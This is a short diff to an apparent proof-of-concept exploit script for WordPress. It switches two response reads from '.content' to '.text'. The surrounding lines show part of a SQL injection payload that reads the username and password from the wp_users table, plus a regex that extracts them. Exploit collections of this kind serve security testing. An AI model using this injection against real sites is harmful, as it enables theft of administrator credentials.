@@ -59,7 +59,7 @@ class Poc(ABPoc):
                          '34,59,125)as CHAR))FROM wp_users WHERE ID=1')
             }
 
-            response = requests.get(url, params=params).content
+            response = requests.get(url, params=params).text
             match = re.search(
                 r'type="text/css" href="(?P<Username>.*):(?P<Password>.*)">', response)
 
@@ -85,7 +85,7 @@ class Poc(ABPoc):
                          '34,59,125)as CHAR))FROM wp_users WHERE ID=1')
             }
 
-            response = requests.get(url, params=params).content
+            response = requests.get(url, params=params).text
             match = re.search(
                 r'type="text/css" href="(?P<Username>.*):(?P<Password>.*)">', response)
 
